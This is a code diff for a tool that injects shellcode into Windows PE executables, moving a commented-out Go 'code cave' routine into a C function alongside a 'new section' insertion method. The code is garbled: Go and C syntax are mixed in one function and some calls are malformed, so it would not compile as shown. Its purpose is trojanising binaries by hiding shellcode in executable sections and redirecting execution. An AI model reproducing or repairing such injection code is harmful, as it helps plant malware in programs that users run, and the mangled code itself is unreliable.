@@ -1,5 +1,6 @@
 int binject_PE(char *file,char *shellcode,int method)
-{func align(size, align, addr uint32) uint32 {
+{
+	int align(size, align, addr uint32) uint32 {
 	if 0 == (size % align) {
 		return addr + size
 	}
@@ -40,33 +41,6 @@ func PeBinject(sourceBytes []byte, shellcodeBytes []byte, config *BinjectConfig)
 		break
 	}
 
-	/*
-		// Code Cave Method
-		shellcodeLen := len(shellcodeBytes) + 5 // 5 bytes get added later by AppendSuffixJmp
-		for _, section := range peFile.Sections {
-			flags := section.Characteristics
-			if flags&pe.IMAGE_SCN_MEM_EXECUTE != 0 { // todo: should we do the TLS section or other non-X sections?
-				// this section is executable
-				data, err := section.Data()
-				if err != nil {
-					return nil, err
-				}
-				caves, err := FindCaves(data)
-				if err != nil {
-					return nil, err
-				}
-				for _, cave := range caves {
-					if cave.End <= uint64(section.Size) && cave.End-cave.Start >= uint64(shellcodeLen) {
-						scAddr := section.Offset + uint32(cave.Start)
-						shellcode := api.ApplySuffixJmpIntel64(shellcodeBytes, uint32(scAddr), uint32(entryPoint), binary.LittleEndian)
-						peFile.InsertionAddr = scAddr
-						peFile.InsertionBytes = shellcode
-						return peFile.Bytes()
-					}
-				}
-			}
-		}
-	*/
 	// Add a New Section Method (most common)
 	shellcodeLen := len(shellcode)
 	newsection := new(pe.Section)
@@ -131,6 +105,34 @@ func PeBinject(sourceBytes []byte, shellcodeBytes []byte, config *BinjectConfig)
 }
   if(method==CODE_CAVE)
   {
+	  
+	/*
+		// Code Cave Method
+		shellcodeLen := len(shellcodeBytes) + 5 // 5 bytes get added later by AppendSuffixJmp
+		for _, section := range peFile.Sections {
+			flags := section.Characteristics
+			if flags&pe.IMAGE_SCN_MEM_EXECUTE != 0 { // todo: should we do the TLS section or other non-X sections?
+				// this section is executable
+				data, err := section.Data()
+				if err != nil {
+					return nil, err
+				}
+				caves, err := FindCaves(data)
+				if err != nil {
+					return nil, err
+				}
+				for _, cave := range caves {
+					if cave.End <= uint64(section.Size) && cave.End-cave.Start >= uint64(shellcodeLen) {
+						scAddr := section.Offset + uint32(cave.Start)
+						shellcode := api.ApplySuffixJmpIntel64(shellcodeBytes, uint32(scAddr), uint32(entryPoint), binary.LittleEndian)
+						peFile.InsertionAddr = scAddr
+						peFile.InsertionBytes = shellcode
+						return peFile.Bytes()
+					}
+				}
+			}
+		}
+	*/
    for(i=0;i<sections;i++)
   {
        x=find_code_cave(strlen(shellcode,section_start,section_end,file_buffer);
